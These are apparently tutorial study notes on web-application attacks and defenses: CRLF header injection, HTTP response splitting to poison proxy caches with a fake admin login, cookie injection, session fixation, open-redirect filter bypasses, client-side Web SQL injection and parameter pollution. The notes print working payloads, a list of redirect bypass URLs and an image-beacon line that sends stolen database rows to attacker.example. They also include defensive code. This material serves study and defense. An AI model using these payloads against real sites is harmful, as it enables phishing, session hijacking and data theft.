3. If only one newline is allowed or filtered, try creative encodings (see below) — some filters decode once, some twice, some reject nulls, so try variants and observe the raw headers.

4. If you can inject full headers/body, think impact: XSS via injected HTML, cookie/session fixation, cache poisoning, or forged redirects. Always test in an intercepting proxy and scan caches/CDNs for poisoning.

*What the bypass strings from the book mean:*

- ```foo%00%0d%0abar``` — embeds a null byte (```%00```) followed by CR (```%0d```) and LF (```%0a```); nulls sometimes bypass naive sanitizers that later strip CR/LF.

- ```foo%250d%250abar``` — double-encoded: ```%25``` is ```%``` so when decoded once it becomes ```foo%0d%0abar```; if the server decodes only once later, you get CR/LF in the final value.

- ```foo%%0d0d%%0a0abar``` — an obfuscated variant that aims to confuse simple regex filters (mixing extra percent signs / characters so different decoders treat it differently). Use these as templates — try single/double encoding, mixed case (```%0D```), and inserting ```%00``` to see how the app normalizes input.

#### Injecting Cookies (via HTTP Header Injection / CRLF):

This attack is just a direct follow-up to header-injection/response-splitting: if you can inject CR (```%0D```) and LF (```%0A```) into a header-valued parameter, you can terminate the header the app intended and inject a new ```Set-Cookie:``` line into the HTTP response. For example (intentional percent-encoding shown):

Attack request (user clicks this):

```
GET /settings/12/Default.aspx?Language=English%0D%0ASet-Cookie:%20SessId=120a12f98e8;path=/; HTTP/1.1
Host: mdsec.net
```

Server may emit (raw response headers):

```
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Set-Cookie: SessId=120a12f98e8; path=/
```

That injected cookie is stored by the victim’s browser and can persist across sessions depending on its attributes (no ```HttpOnly```/```Secure```/```SameSite```, explicit ```Expires/Max-Age```, ```path/domain```). Consequences include session fixation, cookie poisoning, cache poisoning, and helping staged XSS/phishing attacks.

*Defenses (again):* never build header values by concatenating user input — use your framework’s header APIs; strip or reject CR/LF (```\r\n```) from any input used in headers; validate against allow-lists (e.g., language must be ```en|fr|es```); ensure important cookies are set server-side with ```HttpOnly```, ```Secure```, and ```SameSite``` and that proxies/CDNs normalize header values.

### Delivering Other Attacks via Header Injection:

Once you can inject CRLF (```%0D%0A```) into HTTP headers, you’re not just limited to cookies or minor header tampering—you can control the *entire HTTP response body.* That means you can deliver just about any payload:

- Virtual website defacements (replace content with your own HTML).

- Script injection (inline JavaScript, XSS).

- Arbitrary redirection (Location: ```headers```).

- ActiveX/Flash/legacy browser control abuse.

The nastiest form of this is *HTTP Response Splitting*, which specifically targets *caching proxies.*

*What is HTTP Response Splitting?*

The core trick:

- You inject *two responses into one.*

- The vulnerable app thinks it’s returning *one* response.

- The proxy (sitting between users and the app) interprets it as *two* separate HTTP responses.

Result: the attacker “poisons” the proxy’s cache so that *all users who request a page get the attacker’s malicious page instead of the real one.*

*Step-by-Step Breakdown:*

1. Pick a target page:

Attacker wants ```/admin/``` replaced with a Trojan login page. Everyone behind the proxy who goes to ```/admin/``` will then see the fake form.

2. Inject split response:

The attacker finds a header injection point (like ```Language=``` parameter) and inserts:

```
%0d%0aContent-Length: 22
%0d%0a%0d%0a<html>%0d%0afoo%0d%0a</html>
%0d%0aHTTP/1.1 200 OK
Content-Length: 2307
%0d%0a%0d%0a<html>
<head>
<title>Administrator login</title>
...
```

Let’s decode that:

- ```%0d%0a``` = CRLF = newline.

- First part: ```Content-Length: 22``` + ```<html>foo</html>``` → a tiny, valid HTML page.

- Then attacker starts a new response: ```HTTP/1.1 200 OK```, sets ```Content-Length: 2307```, and begins serving their Trojan login page.

To a naive proxy, this looks like *two proper responses* chained together.

3. Use HTTP pipelining:

The attacker pipelines two requests on the same TCP connection:

```
GET /settings/12/Default.aspx?Language=...attack_here... HTTP/1.1
Host: mdsec.net
Proxy-Connection: Keep-alive

GET /admin/ HTTP/1.1
Host: mdsec.net
Proxy-Connection: Close
```

Key idea:

- First request triggers the split-response injection.

- Second request immediately asks for ```/admin/```.

4. (to 6.) Proxy gets tricked:

- App responds to the first request with the attacker’s injected response (tiny page + Trojan page).

- Proxy reads *two responses:*

First = short HTML snippet.

Second = long HTML that looks like the “real” response to ```/admin/```.

- Proxy caches the attacker’s Trojan as the legitimate ```/admin/``` page.

- Any later request for ```/admin/``` now serves the poisoned version.

*(If the proxy already cached ```/admin/```, the attacker can use headers like ```If-Modified-Since``` to force a revalidation and overwrite it.)*

7. Actual server response is discarded:

When the app eventually sends the *real* ```/admin/``` page, the proxy ignores it—because it already matched the Trojan content to the earlier request.

8. Victims eat the bait:

Now, whenever a user behind that proxy requests ```/admin/```, they get the cached Trojan login form. They enter credentials → creds flow straight to the attacker.

*Why this Works:*

- HTTP is text-based and line-delimited → easy to smuggle fake headers/responses.

- Caching proxies are “dumb” in the sense that they trust whatever looks like a valid response.

- If you can inject headers and control the body, you can split responses and poison caches.

*Defenses:*

- Strictly sanitize input → reject CRLF anywhere near headers.

- Use frameworks that build headers safely (no string concatenation).

- Configure proxies to validate origin server responses more strictly.

- Cache poisoning mitigations: disable shared proxy caching for sensitive endpoints (esp. login/admin).

*Bonus:* Here’s a compact ASCII diagram to make the HTTP response-splitting / proxy-cache-poison flow crystal:

```
[Attacker]                             [Proxy]                          [Origin Server]
   |                                     |                                    |
1: open TCP ---------------------------->|                                    |
   |                                     |                                    |
2: GET /vuln?lang=...CRLF+payload... --->|                                    |
   |                                     |<--- (forwards) GET /vuln?lang=...--|
   |                                     |                                    |
   |                                     |<--- Response A (attacker-injected: tiny-html + then a full fake Response B)
   |                                     |   <- Looks like TWO responses chained
3: GET /admin --------------------------->|                                    |
   |                                     | (proxy maps second chained response -> /admin and caches it)
   |                                     |                                    |
4: Origin later returns real /admin ---> | (ignored or considered mismatched)  |
   |                                     |                                    |
5: Victim requests /admin -------------> |                                    |
   |                                     |--serves cached (poisoned) Response B-> Victim
```

*Quick caption:* attacker injects CRLF into headers (via ```/vuln```) so the server’s reply looks like two responses; the proxy, seeing pipelined requests, associates the second fake response with ```/admin``` and caches it — victims later get the poisoned page.

#### Preventing HTTP Header Injection:

The safest rule: *don’t put raw user input into response headers.* When you must, use defense-in-depth: (1) *input validation* — accept only the smallest, strictest set of values appropriate for that field (e.g., language codes ```en|fr|es```, short alpha tokens, fixed length), and (2) *output validation / sanitization* — disallow or canonicalize control characters before writing headers (treat any ASCII < ```0x20``` as suspicious and reject the request).

Also, for any endpoint that must never be cached or proxied, send explicit caching headers (```Cache-Control: private, no-store, no-cache, must-revalidate```) or avoid letting shared proxies cache it; and prefer HTTPS everywhere so intermediate caches have less chance to be abused (but remember: HTTPS alone doesn’t stop a misconfigured reverse proxy behind the TLS terminator from being poisoned).

*Quick Node/Express sanitizer example:*

```
// stripControl.js
module.exports = function stripControl(value) {
  if (typeof value !== 'string') return '';
  return value.replace(/[\x00-\x1F\x7F]/g, ''); // remove control chars (CR/LF, NUL, etc.)
};

// usage in Express
const stripControl = require('./stripControl');
res.setHeader('Set-Cookie', `PreferredLanguage=${stripControl(req.query.lang)}; Path=/; HttpOnly; Secure`);
```

*Quick Breakdown:*

1. ```module.exports = ...``` exposes the sanitizer so any file can ```require()``` it — simple module boundary. The advantage of using ```require()``` (or ```import``` in newer syntax) is *modularity* — you write something once and reuse it everywhere instead of copy-pasting. By exporting your sanitizer function (or anything else), you:

- *Avoid duplication* – fix or improve code in one place and every file using it benefits instantly.

- *Keep scope clean* – functions don’t clutter the global namespace, so you don’t accidentally overwrite variables or cause conflicts.

- *Improve organization* – each file does one thing: for example, ```stripControl.js``` handles sanitization while ```server.js``` handles routes.

- *Enable testing* – you can unit test the sanitizer independently without firing up the whole app.

2. The ```typeof``` check stops non-strings from crashing the regex and returns an empty safe value instead of ```undefined``` or ```null```.

3. The regex ```/[\x00-\x1F\x7F]/g``` matches control characters (ASCII 0x00–0x1F and DEL 0x7F) — ```replace()``` removes them so CR/LF cannot be injected into headers.

4. In usage you ```require()``` the function, call it on user input, then pass the cleaned value into ```res.setHeader```; because the replacement runs before the header API, no raw CR/LF ever reaches the wire. ```res.setHeader()``` is part of Node.js’s *HTTP response API* and it’s the function that *builds or modifies the HTTP headers* before the response is sent to the client. Think of it as manually writing lines into the “envelope” that goes out before your data. Here’s the flow:

- When a client makes a request, Node gives you a ```response``` object (```res```).

- Before you call ```res.end()``` or ```res.send()```, you can use ```res.setHeader(name, value)``` to add headers—like ```Content-Type```, ```Set-Cookie```, or anything custom.

- Once headers are sent (after the first byte of body data leaves), you *can’t* change them anymore. Example:

```
res.setHeader('Content-Type', 'text/html');
res.setHeader('X-Powered-By', 'MistyDreamer v1.0');
res.end('<h1>Hello, hacker world!</h1>');
```

That would send something like this back to the browser:

```
HTTP/1.1 200 OK
Content-Type: text/html
X-Powered-By: MistyDreamer v1.0
```

So yeah — it’s basically the command center for crafting your outgoing HTTP headers before the body gets unleashed.

5. Extra practical notes: prefer an allow-list (e.g. ```/^[a-z]{2}$/``` for language codes) over just stripping, enforce max length, and always set cookie flags (```HttpOnly```, ```Secure```, ```SameSite```) — and consider rejecting bad input with a 4xx rather than silently using ```''```.

Final note: prefer framework header APIs (they often handle encoding) and use allow-lists rather than blacklists — rejecting unexpected input is way simpler and safer than trying to outsmart every obfuscation trick.

### Cookie Injection:

Cookie injection is any technique that lets an attacker set or modify cookies in a victim’s browser (not by logging in as them, but by planting values the browser will later send). Common delivery paths are: (1) app features that naively echo name/value pairs into ```Set-Cookie```, (2) HTTP header/CRLF injection, (3) XSS on sibling or parent domains (subdomain XSS can set cookies for the parent), and (4) active network attacks (MITM) on unprotected networks.

If an attacker can control cookies in the victim’s browser they can: break app logic (e.g. flip ```UseHttps=false```), feed attacker-controlled data into client-side code (leading to DOM XSS), defeat weak CSRF schemes that compare a cookie *and* a parameter, or enable session fixation/persistent login abuse.

Some attacks rely on getting the victim to operate while logged into the attacker’s account (so stored payloads the attacker uploaded are visible to the victim). If the login form is CSRF-protected and can’t be abused to force the victim to log in as the attacker, the attacker can instead *set the victim’s session cookie* directly to a session value the attacker controls. The victim’s browser will then present that session cookie to the site and the site will treat the victim as logged in to the attacker’s account — no login POST required. Once the browser runs the attacker’s stored XSS (or other payloads visible only to that account), the attacker can pivot from there (for example, steal credentials or escalate).

*Mitigations:*

- Never create cookie headers from raw user input; use allow-lists and strict validation.

- Mark sensitive cookies ```HttpOnly; Secure; SameSite=Strict``` and prefer ```__Host-``` / ```__Secure-``` prefixes where supported.

- Don’t rely on cookie+parameter equality as a CSRF token; use single-use, session-bound CSRF tokens stored server-side.

- Regenerate session IDs on authentication and on privilege changes; reject externally supplied session IDs.

- Harden subdomains (content security policies, fix XSS) and avoid placing user-editable content on any domain that can set parent cookies.

### Session Fixation:

Session fixation happens when an attacker *chooses* a session identifier and forces (or convinces) a victim’s browser to use that identifier. After the victim authenticates, the attacker reuses that same identifier to impersonate the victim. Unlike session hijacking (where you steal a live token), fixation seeds a token and waits.

Textual diagram:

```
1) Attacker: GET /login.php  --->  Server issues SessId=ATTACKER_TOKEN
2) Attacker: deliver link/cookie containing SessId=ATTACKER_TOKEN  ---> Victim's browser now uses ATTACKER_TOKEN
3) Victim: logs in (with ATTACKER_TOKEN) ---> Server upgrades that session to authenticated
4) Attacker: uses ATTACKER_TOKEN to access victim's authenticated session
```

How tokens get fixed (common vectors):

- *Cookies:* attacker injects a ```Set-Cookie``` (CRLF/header injection, subdomain XSS, or other cookie-injection path).

- *URL parameters / URL session IDs:* attacker sends a link like ```https://app.example/login?SessId=...``` or ```;jsessionid=....``` (URL session IDs still exist in some legacy apps, but modern frameworks and browsers discourage/avoid them.)

- *Hidden form fields:* attacker uses CSRF or other tricks to get the victim to submit a form containing the attacker’s token.

- *Arbitrary token acceptance:* some servers will accept any token presented and create/associate a session for it — this makes fixation trivial because the attacker can invent tokens at will.

*Side note:* Is ```;jsessionid=...``` still a thing?

Some legacy Java apps and older toolchains still support URL-based session ids; it’s uncommon in modern, well-configured apps (most frameworks prefer cookie sessions and explicitly disable URL session propagation). But you will still encounter it in old intranets or poorly configured apps — treat any URL-session feature as high-risk.

*Important subtlety:*

When the book says fixation can be done by “passing his own session token directly to the user,” it means: if the attacker can plant a session token (cookie or other) in the victim’s browser, the victim will send that token on future requests and the server will treat those requests as belonging to *that* session. If that session belongs (or is later authenticated) to the attacker’s account, the attacker now has access. This bypasses CSRF-on-login defenses because you aren’t forcing a login POST — you’re making the browser *already* logged in to the attacker’s session.

*Why some servers make it easy:*

Historically some servers (IIS, old ColdFusion, older frameworks) accepted arbitrary session IDs and created server-side session state for them on demand, or failed to rotate session IDs at login. That behavior makes fixation trivial: attacker picks any token and distributes it widely; when a victim uses it and logs in, attacker reuses it. Modern servers are less likely to do that by default, but misconfigurations still happen.

*Defenses:*

- *Always* issue a new session identifier immediately after authentication (rotate ```session_id``` on login).

- Reject externally supplied session identifiers where possible; only accept server-issued IDs.

- Avoid putting session IDs in URLs. Disable URL-session propagation.

- On login regenerate session and migrate state (don’t “upgrade” an anonymous session token to authenticated without changing the token).

- Use strict cookie flags (```HttpOnly; Secure; SameSite=Strict```) and set proper ```Path```/```Domain```.

- Optionally bind sessions to additional factors (IP range, user-agent fingerprint) — but be careful with mobile/ISP churn.

- For apps that allow anonymous carts/orders: tie sensitive checkout flows to freshly issued, server-side tokens and require re-authentication for viewing/changing saved sensitive data.

- Log and alert on unusual reuse of session tokens (same token seen from different IP ranges/devices).

*How to test for it as a pentester:*

- Try to obtain a session ID, then *inject* it into a victim-like browser (via ```Set-Cookie``` injection, a crafted link if URL sessions exist, or social-engineer the victim to open a URL).

- Then authenticate (or cause someone else to authenticate) and see if the attacker can reuse the token.

- Check whether login rotates the session id (inspect ```Set-Cookie``` after login).

- Probe whether the server will accept arbitrary tokens by presenting random-looking session IDs—does it create a session or reject them?

#### Finding & Exploiting Session Fixation:

*What to look for (two bad patterns):*

1. The app issues an anonymous session to visitors and *upgrades* that same session to authenticated after login (no new session id).

2. The app issues a session only after login but will *accept and reuse an already-authenticated token* if a user hits the login form while presenting someone else’s token.

In both cases the attacker seeds a token (cookie/URL/hidden field) into the victim’s browser; when the victim authenticates, the attacker can reuse that same token to access the victim’s authenticated session.

*Quick test:*

1. Obtain a valid session id (request login page or login with attacker creds).

2. Inject that id into a test browser (cookie, URL param, or hidden field) that simulates the victim.

3. Log in from that browser (or have the victim do so). If the server does *not* rotate the session id after authentication, you’ve got fixation.

4. Also test whether the server will accept arbitrary, previously-unknown tokens (send random-looking ids) — if it does, fixation is trivially scalable.

*Why it matters:*

If session ids persist across privilege changes, an attacker who can plant an id can hijack accounts without stealing cookies later. Servers that accept arbitrary ids make long-lived mass attacks (mailing a fixed-id link to many users) possible.

*Prevention:*

*Always* issue a fresh session identifier immediately after authentication (rotate ```session_id``` and migrate any session state). Reject externally supplied session ids where possible and avoid putting session tokens in URLs. For sensitive transitions (login, first submission of PII, checkout) regenerate the session and consider per-page nonces or re-auth prompts. Finally, set secure cookie attributes (```HttpOnly; Secure; SameSite```) and log unusual token reuse.

### Open redirection:

Open redirects happen when user input determines where the app tells the browser to go. They’re usually lower-risk than XSS, but they’re very handy for phishing because an attacker can craft a URL that *looks* like it points to the real site but bounces victims off to a fake page. A goofy modern use is “rickrolling” — tricking people into clicking a legit-looking link that ultimately redirects them to Rick Astley’s “Never Gonna Give You Up” video as a prank.

How redirects can be issued:

- *HTTP 3xx + Location:*

```
HTTP/1.1 302 Found
Location: https://mdsec.net/updates/update29.html
```

- *HTTP Refresh header:*

```
HTTP/1.1 200 OK
Refresh: 0; url=https://mdsec.net/updates/update29.html
```

- *HTML meta-refresh:*

```
<meta http-equiv="refresh" content="0; url=https://mdsec.net/updates/update29.html">
```

- *JavaScript redirect:*

```
document.location = "https://mdsec.net/updates/update29.html";
```

Note: executing a redirect via JS is convenient but *dangerous* if you put untrusted input into that string — always validate against an allow-list or map short tokens/server-side.

**How to find redirects:**

Use an intercepting proxy (Burp or OWASP ZAP) and crawl the app while watching responses for ```3xx``` Location headers, ```Refresh``` headers, meta-refresh tags, or JS-based ```location```/```window.location```/```document.location``` assignments. Grep the app for common redirect parameter names (```redirect```, ```next```, ```returnTo```, ```url```, ```dest```, ```goto```) and fuzz parameter values (try absolute URLs) to see whether the app follows them. Automated scanners (Burp active scan, ZAP) help, but manual inspection with an intercepting proxy is the fastest and most reliable.

*Frames & stealthy redirections:*

If user input controls the ```src``` of a ```<frame>```/```<iframe>``` (or a ```frame``` target), you can cause external content to load *inside* the legitimate site’s UI while the address bar remains unchanged. That’s essentially a stealthy redirect: the browser still shows the real domain, but part of the page displays attacker-controlled content (great for covert phishing or fake login boxes). Defend by disallowing user-controlled frame targets, sanitizing inputs, and using CSP/frame-ancestors/X-Frame-Options.

*When filters are present: probe smartly*

If the app blocks absolute URLs or enforces a prefix, try bypasses: absolute→relative conversions, protocol-relative (```//evil.com```), URL-encoding, double-encoding, or supplying attacker-controlled short tokens that the server resolves to URLs. But the *best* fix is server-side allow-listing (only redirect to a small set of known good hosts or map keys to safe destinations).

#### Common naive-block bypasses (Absolute URLs):

- *Case-mixed scheme:*

```
HtTp://mdattacker.net
```

*Why:* simple ```startsWith("http://")``` checks that are case-sensitive will miss this.

- *Null byte trick:*

```
http://mdattacker.net%00http://mdattacker.net
```

*Why:* some servers strip/stop at ```\0``` or treat it oddly during normalization, leaving attacker URL effective after decoding.

- *Leading-space / whitespace:*

```
http://mdattacker.net
```

*Why:* naive ```trim``` not applied or validation fails to trim before check; leading whitespace fools ```startsWith```.

- *Protocol-relative URL:*

```
//mdattacker.net
```

*Why:* not starting with ```http:``` so a filter blocking ```http://``` won't catch it; the browser inherits page scheme (```https:``` → ```https://mdattacker.net```).

- *Percent-encoded scheme:*

```%68%74%74%70%3a%2f%2fmdattacker.net``` → decodes to ```http://mdattacker.net```

- *Why:* filter checks raw string but server decodes percent escapes later.

- *Double-encoded:*

```
%2568%2574%2574%2570%253a%252f%252fmdattacker.net
```

*Why:* one decode pass gives ```%68...``` then another decode yields ```http://...```; mismatched decode stages bypass checks.

- *HTTPS instead of HTTP:*

```
https://mdattacker.net
```

*Why:* some filters only blacklist ```http://``` and forget ```https://```.

- *Backslashes as separators:*

```
http:\\mdattacker.net
```

*Why:* sloppy validators may normalize ```\``` to ```/``` later or browsers tolerate it.

- *Extra slashes / malformed but valid-ish:*

```
http:///mdattacker.net
```

*Why:* weird path parsing can result in the browser resolving to the attacker host after normalization.

#### When the app strips ```http://``` or domains — other neat tricks:

- ```http://http://mdattacker.net```

*Why:* naive removal of the first ```http://``` leaves ```http://mdattacker.net```.

- ```http://mdattacker.net/http://mdattacker.net```

*Why:* stripping first appearance can still leave a valid absolute URL later in the string.

- ```hthttp://tp://mdattacker.net```

*Why:* basic substring replacement algorithms can be tricked by shuffled fragments that reassemble after normalization.

#### When the app insists the URL “contains” the app’s domain (host validation bypasses):

- ```http://mdsec.net.mdattacker.net```

*Why:* string-contains check for ```mdsec.net``` passes even though host is mdattacker.net (subdomain trick).

- ```http://mdattacker.net/?http://mdsec.net```

*Why:* the attacker URL is still the real destination; the app’s ```contains``` check spots ```mdsec.net``` in the query and falsely approves.

- ```http://mdattacker.net/%23http://mdsec.net``` (i.e. ```http://mdattacker.net/#http://mdsec.net```)

*Why:* fragment includes the trusted domain string while the actual fetch target is the attacker host.

**Tiny defensive checklist:**

- *Canonicalize first* — fully decode, remove control chars, normalize whitespace, and parse with a real URL parser.

- *Allow-list destinations* — only redirect to an explicit set (hostnames or internal token→URL map).

- *Reject URL-based sessions/redirects where possible* — prefer server-side mapping keys (e.g., ```?next=dashboard``` → server maps to safe URL).

#### Addition of an Absolute Prefix:

When an app builds a redirect by *concatenating* an absolute prefix like ```http://mdsec.net``` with unvalidated user input, a naive implementation that *omits the trailing slash* can be tricked into sending the browser to an attacker-controlled host.

Example: the app does Location: ```http://mdsec.net``` + ```user_input```; if ```user_input``` = ```.mdattacker.net``` the result becomes ```http://mdsec.net.mdattacker.net``` — which is a domain the attacker controls (a subdomain of ```mdattacker.net```), so the redirect goes off-site.

If the prefix includes the trailing slash (```http://mdsec.net/)```, appending mdattacker.net yields ```http://mdsec.net/mdattacker.net``` and stays on the honest site, so the trailing slash matters a lot.

When redirects are created client-side from DOM data, the redirect code and any validation are visible in the browser — inspect them carefully. Use DevTools (Firefox or Chrome): open *Sources*, search for ```location```, ```window.open```, ```document.location``` etc., set breakpoints on DOM modifications or XHR/fetch, then trigger the flow and watch the exact value used for the redirect (you can even edit it live in the Console).

Quick defensive rule: *canonicalize & parse* the candidate URL server-side and only allow-list destinations (or use server-side tokens that map to safe URLs); never trust client-side checks alone.

#### Preventing Open Redirection Vulnerabilities:

Nice and simple: the safest rule is *don’t put untrusted input directly into redirect targets.* If you can avoid a redirect page that accepts a ```url=``` parameter, do that — direct links are the cleanest, lowest-surprise option.

If you must have a central redirector, use an *index (lookup) approach:* instead of ```redirect?url=https://evil```, use ```redirect?id=42```. The server keeps a server-side list (array/map) of allowed targets like ```{42: "/profile/home", 43: "https://trusted.partner.com/welcome"}``` and the redirector only looks up the ID and redirects to the corresponding safe URL. That way the client can never supply an arbitrary URL — only an index that you control.

If you absolutely have to accept URL-like input from users, prefer strict *allow-listing* and canonical checks:

- Prefer *relative URLs only:* accept ```/path/to/page``` but reject anything containing ```:``` before the first ```/``` (this blocks ```http:/javascript:```). Don’t try to “sanitize” dodgy strings — reject them.

- Or prepend your canonical origin: if input is ```foo```, turn it into ```https://yourdomain.com/foo```; if it already starts with ```/```, prepend the origin. That forces redirects to remain on your site.

- Or require *absolute URLs* but only allow those beginning with ```https://yourdomain.com/``` (exact-match prefix check).

Avoid client-side-only protections (DOM-based redirects) — the validation and mapping must happen server-side. Small defensive checklist: canonicalize and parse the candidate URL server-side, use an allow-list or id→URL mapping, and never accept raw absolute targets from users.

*Flask (Python) Example:*

```
urls = {"1": "/dashboard", "2": "/profile"}
@app.route("/redirect")
def safe_redirect():
    return redirect(urls.get(request.args.get("id"), "/"))
```

Breakdown:

- ```urls``` is your whitelist — only paths you control.

- The user sends something like ```/redirect?id=2```.

- ```urls.get()``` looks it up — if it’s valid, redirect happens; if not, default to / (no error, no hijack).

*Node.js (Express) Example:*

```
const urls = { "1": "/dashboard", "2": "/profile" };
app.get("/redirect", (req, res) => res.redirect(urls[req.query.id] || "/"));
```

Breakdown:

- Same logic: look up ```id``` → safe URL.

- No direct ```url``` parameter anywhere — attacker can’t slip in ```http://evil```.

- Default ```/``` catch ensures graceful failure instead of risky behavior.

That part:

```
res.redirect(urls[req.query.id] || "/");
```

— is using JavaScript’s *logical OR* (```||```) operator as a *fallback mechanism.* Here’s the logic breakdown:

- ```urls[req.query.id]``` → looks up the value in the ```urls``` dictionary using the ```id``` from the query (like ```1```, ```2```, etc.).

- If that lookup *returns* ```undefined``` (for example, if someone visits ```?id=99``` which isn’t in the list),

- Then the ```|| "/"``` part kicks in — meaning *“redirect to ```/``` instead”*.

So it’s like saying: “Redirect to the URL if it exists; otherwise, just send them home.”

*Additional Notes:*

In both examples, the ```"id"``` argument isn’t *defined* in the code — it’s *supplied by the user through the URL query string.* That’s how the redirect page knows which destination to use. For example, if you visit:

```
https://example.com/redirect?id=2
```

then ```request.args.get("id")``` in Flask (or ```req.query.id``` in Express) reads that ```id=2``` part from the query string. So “id” isn’t declared in your script — it’s just a name you chose for a URL parameter. You could rename it to ```"page"```, ```"next"```, or ```"banana"``` and it would work the same.

### Client-Side SQL (Web SQL):

Example:

```
var db = openDatabase('contactsdb', '1.0', 'WahhMail contacts', 1000000);
db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS contacts (id unique, name, email)'); tx.executeSql('INSERT INTO contacts (id, name, email) VALUES (1, "Matthew Adamson", "madam@nucnt.com")'); });
```

Breakdown:

```openDatabase``` opens (or creates) a *Web SQL* database (an API that wraps a SQLite engine exposed to the page).

```transaction``` gives you a ```tx``` object and ```executeSql()``` runs SQL statements inside that transaction. The data is persisted on the client (usually on disk in the browser’s profile — not an ephemeral in-RAM store like Redis) and is scoped to the origin (scheme+host+port).

Note: *Web SQL is deprecated* and not implemented in all browsers; *IndexedDB* is the modern, supported client DB API — but many old/embedded apps still use Web SQL (or similar local storage backed by SQLite).

*How client-side SQL injection looks in practice?*

If the app builds SQL by concatenating attacker-controllable strings into ```executeSql()``` (e.g. ```tx.executeSql("INSERT INTO msgs (body) VALUES ('" + subj + "')")```), an attacker can inject SQL metacharacters via mail subjects, comments, or other inputs that the app stores locally.

Exploits commonly follow this flow: (1) inject payload into any field the app will persist locally, (2) trigger the client code path that constructs and runs the vulnerable SQL, (3) use browser JS (or the same malicious code path) to read sensitive rows and exfiltrate them — e.g. by creating an ```<img src="https://attacker.example/collect?d="+encodeURIComponent(stolen) />``` or sending a ```fetch()``` to the attacker.

In practice you’ll test this by inspecting the site’s JS for ```executeSql()``` or ```openDatabase()```, reproducing inputs, and using the browser console to query the DB directly (e.g. run ```db.transaction(function(t){t.executeSql('SELECT * FROM contacts',[],function(tx,rs){console.log(rs.rows)});});```).

*Tools & techniques:* DevTools (Sources/Console) to find ```executeSql``` usages, Burp/Proxy to inject payloads into requests, and the Console to run diagnostic SQL. For exfiltration proof-of-concepts you can inject a script that reads the DB and issues an image beacon or ```fetch()``` to your collector. Older scanners won’t catch client DB SQLi automatically — manual inspection is usually required.

*Defenses (practical):*

- Never build SQL by string concatenation in client code — use parameterized ```executeSql(sql, params, ...)```.

- Prefer IndexedDB or server-side storage for sensitive data; avoid storing secrets on the client.

- Perform input validation/allow-listing before persisting and escape/parameterize any SQL statements.

- Use CSP and reduce the attack surface for injected scripts; treat client-side storage as untrusted and encrypt/sanitize if it must hold sensitive values.

*Short version:* client-side SQLi is the same concept as server-side SQLi but happens in the victim’s browser — find ```openDatabase```/```executeSql``` or sloppy string concatenation, test via DevTools, and exfiltrate with a simple JS beacon; fix it with parameterized queries and by not storing secrets client-side.

*Bonus:*

Here’s a tiny DevTools-ready snippet you can paste into the Console to *read* a WebSQL table named ```contacts```, plus a short, line-by-line breakdown and a safe example of how the app *should* run queries (parameterized). Use this for testing and verification only.

```
// Dump all rows from the 'contacts' table (Web SQL)
var db = openDatabase('contactsdb', '1.0', 'WahhMail contacts', 1000000);
db.transaction(function(tx) {
  tx.executeSql('SELECT * FROM contacts', [], function(tx, rs) {
    for (let i = 0; i < rs.rows.length; i++) {
      console.log('row', i, rs.rows.item(i));
    }
  }, function(tx, err) {
    console.error('SQL error:', err);
  });
});
```

Breakdown:

1. ```openDatabase(...)``` — opens (or creates) the origin-scoped Web SQL DB (backed by SQLite on disk, not in-memory like Redis).

2. ```db.transaction(function(tx){ ... })``` — starts a transaction and gives a ```tx``` object used to run queries.

3. ```tx.executeSql('SELECT * FROM contacts', [], successCallback, errorCallback)``` — runs the SQL; the second arg is an array of parameters (empty here).

4. In ```successCallback(tx, rs)``` the ```rs.rows``` collection holds results; ```rs.rows.item(i)``` returns each row as a plain object.

5. ```errorCallback``` logs problems (table not found, syntax error, etc.).

*Safe / correct way to insert (use parameterized queries — do not concatenate user input):*

```
// Parameterized insert — never build SQL with string concatenation
db.transaction(function(tx) {
  tx.executeSql(
    'INSERT INTO contacts (id, name, email) VALUES (?, ?, ?)',
    [1, 'Alice Example', 'alice@example.com'],
    function() { console.log('insert ok'); },
    function(tx, err) { console.error('insert error', err); }
  );
});
```

Breakdown:

1. ```db.transaction(function(tx){ ... })``` — opens a client-side transaction; ```tx``` is the transactional context used to run one or more SQL statements atomically.

2. The SQL string uses ```?``` placeholders instead of concatenating values directly; those placeholders are *bound* to values from the array in the second argument — this is the core defense against SQL injection because the DB treats those values as data, not as SQL.

3. The second argument (```[1, 'Alice Example', 'alice@example.com']```) must match the number and order of ```?``` placeholders; types are handled by the engine, so strings, numbers, etc., are safely inserted.

4. The third function is called on success (you can update UI or continue the flow), and the fourth handles errors (constraint violations, type issues, missing table), letting you react gracefully instead of crashing.

Always pass user-derived values through the parameter array (e.g., ```reqName```), check for unique/auto-increment ```id``` usage to avoid collisions, and still validate/allow-list obvious constraints (email format, max length) so your data quality stays sane even though SQL injection is mitigated.

*Quick notes on testing client-side SQLi:*

- To check for vulnerability, look through Sources for ```executeSql```or ```openDatabase```, find where the app inserts user data, and inspect whether it uses ```?``` parameters.

- If the app concatenates strings into SQL (e.g. ```"... VALUES ('"+ subj +"')"```), that’s unsafe — you can simulate an injection by setting ```subj``` in Console and invoking the same function to observe effects.

- For proof-of-concept exfiltration during a lab, you can read rows (as above) and ```console.log()``` them or use a benign ```fetch()``` to your own collector; in real testing always follow rules of engagement and never exfiltrate real users’ data.

### Client-Side HTTP Parameter Pollution (HPP):

Client-side HPP happens when attacker-controlled input is reflected into links or form targets on a page without proper normalization, letting an attacker inject extra query parameters into those links. Even if the server defends against XSS and CSRF, this local manipulation can change the meaning of actions the user takes.

Suppose the inbox URL is:

```
https://wahh-mail.com/show?folder=inbox&order=down&size=20&start=1
```

The page renders action links like:

```
<a href="doaction?folder=inbox&order=down&size=20&start=1&message=12&action=reply&rnd=1935612936174">reply</a>
```

If an attacker crafts a URL where ```start``` contains an encoded ampersand, e.g. ```start=1%26action=delete```, the server decodes that to ```start=1&action=delete```. When the page reuses that value verbatim to build the ```reply``` link, the link becomes:

```
doaction?folder=inbox&order=down&size=20&start=1&action=delete&message=12&action=reply&rnd=...
```

Now the ```action``` parameter appears twice (```delete``` then ```reply```). How the server interprets that depends on server-side parsing (often the *first* value wins), so clicking “reply” might actually perform the ```delete``` action.

*Why anti-CSRF tokens often don’t help here:*

Those ```rnd``` tokens protect against *CSRF form submissions*, but client-side HPP changes the *legitimate links* the app itself produced; the token is still present and valid, so the browser will happily follow the altered link and carry a correct token — the CSRF defense wasn’t designed to stop polluted parameters in on-site links.

